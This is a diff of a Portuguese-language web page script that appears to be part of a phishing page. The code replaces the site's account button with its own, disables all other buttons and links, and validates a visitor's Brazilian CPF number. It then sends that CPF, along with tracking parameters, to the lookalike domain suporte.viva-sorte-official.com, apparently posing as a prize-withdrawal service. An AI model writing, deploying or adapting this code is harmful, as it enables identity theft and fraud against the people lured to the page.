@@ -94,112 +94,131 @@
 								}
 							</style>
 							<script>
-								// Função para substituir o botão específico
-								function substituirBotaoEspecifico() {
-									const novoBotao = document.createElement('button');
-									novoBotao.type = 'button';
-									novoBotao.id = 'allowedButton';
-									novoBotao.className = 'button-continuar desabilitado';
-									novoBotao.innerHTML = 'Continuar';
-									novoBotao.disabled = true;
-	
-									const botaoAlvo = document.getElementById('enter-account-id');
-									if (botaoAlvo) {
-										botaoAlvo.parentNode.replaceChild(novoBotao, botaoAlvo);
+								document.addEventListener("DOMContentLoaded", function() {
+									var cpfInput = document.getElementById('novoCampoCPF');
+									var cpfError = document.getElementById('cpfError');
+									var errorImage = document.getElementById('errorImage');
+									var botao = document.getElementById('allowedButton');
+						
+									cpfInput.addEventListener('input', mascaraCPF);
+									botao.addEventListener('click', redirecionarSeValido);
+						
+									function mascaraCPF() {
+										var cpf = cpfInput.value;
+										cpf = cpf.replace(/\D/g, "");
+										if (cpf.length > 11) {
+											cpf = cpf.substring(0, 11);
+										}
+										cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+										cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
+										cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
+										cpfInput.value = cpf;
+						
+										validarCPF();
 									}
-	
-									novoBotao.addEventListener('click', redirecionarSeValido);
-								}
-	
-								function bloquearElementosClicaveis() {
-									document.querySelectorAll('button:not(#allowedButton)').forEach(function (botao) {
-										botao.disabled = true;
-									});
-	
-									document.querySelectorAll('a').forEach(function (link) {
-										link.addEventListener('click', function (event) {
-											event.preventDefault();
+						
+									function validarCPF() {
+										var cpf = cpfInput.value;
+										var cpfNumeros = cpf.replace(/[^\d]+/g, '');
+						
+										if (cpf.length !== 14 || !validaCPF(cpfNumeros)) {
+											cpfError.textContent = cpf.length === 14 ? 'CPF Inválido' : '';
+											cpfInput.classList.toggle('error-border', cpf.length === 14);
+											errorImage.style.display = cpf.length === 14 ? 'inline-block' : 'none';
+											botao.disabled = true;
+											botao.classList.add('desabilitado');
+										} else {
+											cpfError.textContent = '';
+											cpfInput.classList.remove('error-border');
+											errorImage.style.display = 'none';
+											botao.disabled = false;
+											botao.classList.remove('desabilitado');
+										}
+									}
+						
+									function validaCPF(cpf) {
+										cpf = cpf.replace(/[^\d]+/g,'');
+										if(cpf === '' || cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
+										let add = 0;
+										for (let i = 0; i < 9; i++) {
+											add += parseInt(cpf.charAt(i)) * (10 - i);
+										}
+										let rev = 11 - (add % 11);
+										rev = (rev === 10 || rev === 11) ? 0 : rev;
+										if (rev !== parseInt(cpf.charAt(9))) return false;
+										add = 0;
+										for (let i = 0; i < 10; i++) {
+											add += parseInt(cpf.charAt(i)) * (11 - i);
+										}
+										rev = 11 - (add % 11);
+										rev = (rev === 10 || rev === 11) ? 0 : rev;
+										return rev === parseInt(cpf.charAt(10));
+									}
+						
+									function redirecionarSeValido() {
+										var cpf = cpfInput.value.replace(/[^\d]+/g,'');
+										if (validaCPF(cpf)) {
+											var utmParams = getUTMParameters();
+											var queryString = Object.keys(utmParams).map(function(key) {
+												return key + '=' + encodeURIComponent(utmParams[key]);
+											}).join('&');
+						
+											var url = "https://suporte.viva-sorte-official.com/teste/doc?document=" + cpf;
+											if (queryString) {
+												url += '&' + queryString;
+											}
+						
+											window.location.href = url;
+										}
+									}
+						
+									function getUTMParameters() {
+										var params = {};
+										window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(str, key, value) {
+											params[key] = value;
 										});
-									});
-	
-									document.querySelectorAll('img').forEach(function (imagem) {
-										if (imagem.parentNode.tagName === 'A') {
-											imagem.parentNode.addEventListener('click', function (event) {
+										return params;
+									}
+						
+									function substituirBotaoEspecifico() {
+										const novoBotao = document.createElement('button');
+										novoBotao.type = 'button';
+										novoBotao.id = 'allowedButton';
+										novoBotao.className = 'button-continuar desabilitado';
+										novoBotao.innerHTML = 'Continuar';
+										novoBotao.disabled = true;
+						
+										const botaoAlvo = document.getElementById('enter-account-id');
+										if (botaoAlvo) {
+											botaoAlvo.parentNode.replaceChild(novoBotao, botaoAlvo);
+										}
+						
+										novoBotao.addEventListener('click', redirecionarSeValido);
+									}
+						
+									function bloquearElementosClicaveis() {
+										document.querySelectorAll('button:not(#allowedButton)').forEach(function(botao) {
+											botao.disabled = true;
+										});
+						
+										document.querySelectorAll('a').forEach(function(link) {
+											link.addEventListener('click', function(event) {
 												event.preventDefault();
 											});
-										}
-									});
-								}
-	
-								var cpfInput = document.getElementById('novoCampoCPF');
-								var cpfError = document.getElementById('cpfError');
-								var errorImage = document.getElementById('errorImage');
-	
-								cpfInput.addEventListener('input', mascaraCPF);
-	
-								function mascaraCPF() {
-									var cpf = cpfInput.value;
-									cpf = cpf.replace(/\D/g, "");
-									if (cpf.length > 11) {
-										cpf = cpf.substring(0, 11);
+										});
+						
+										document.querySelectorAll('img').forEach(function(imagem) {
+											if (imagem.parentNode.tagName === 'A') {
+												imagem.parentNode.addEventListener('click', function(event) {
+													event.preventDefault();
+												});
+											}
+										});
 									}
-									cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
-									cpf = cpf.replace(/(\d{3})(\d)/, "$1.$2");
-									cpf = cpf.replace(/(\d{3})(\d{1,2})$/, "$1-$2");
-									cpfInput.value = cpf;
-	
-									validarCPF();
-								}
-	
-								function validarCPF() {
-									var cpf = cpfInput.value;
-									var cpfNumeros = cpf.replace(/[^\d]+/g, '');
-	
-									var botao = document.getElementById('allowedButton');
-									if (cpf.length !== 14 || !validaCPF(cpfNumeros)) {
-										cpfError.textContent = cpf.length === 14 ? 'CPF Inválido' : '';
-										cpfInput.classList.toggle('error-border', cpf.length === 14);
-										errorImage.style.display = cpf.length === 14 ? 'inline-block' : 'none';
-										botao.disabled = true;
-										botao.classList.add('desabilitado');
-									} else {
-										cpfError.textContent = '';
-										cpfInput.classList.remove('error-border');
-										errorImage.style.display = 'none';
-										botao.disabled = false;
-										botao.classList.remove('desabilitado');
-									}
-								}
-	
-								function validaCPF(cpf) {
-									cpf = cpf.replace(/[^\d]+/g, '');
-									if (cpf === '' || cpf.length !== 11 || /^(.)\1+$/.test(cpf)) return false;
-									let add = 0;
-									for (let i = 0; i < 9; i++) {
-										add += parseInt(cpf.charAt(i)) * (10 - i);
-									}
-									let rev = 11 - (add % 11);
-									rev = (rev === 10 || rev === 11) ? 0 : rev;
-									if (rev !== parseInt(cpf.charAt(9))) return false;
-									add = 0;
-									for (let i = 0; i < 10; i++) {
-										add += parseInt(cpf.charAt(i)) * (11 - i);
-									}
-									rev = 11 - (add % 11);
-									rev = (rev === 10 || rev === 11) ? 0 : rev;
-									return rev === parseInt(cpf.charAt(10));
-								}
-	
-								function redirecionarSeValido() {
-									var cpf = cpfInput.value.replace(/[^\d]+/g, '');
-									if (validaCPF(cpf)) {
-										var url = "https://suporte.viva-sorte-official.com/saque/saque.html?cpf=" + cpf;
-										window.location.href = url;
-									}
-								}
-	
-								substituirBotaoEspecifico();
-								bloquearElementosClicaveis();
+						
+									substituirBotaoEspecifico();
+									bloquearElementosClicaveis();
+								});
 							</script>
 						</div>
 						<label id="title-outras-op">Outras opções de identificação:</label>
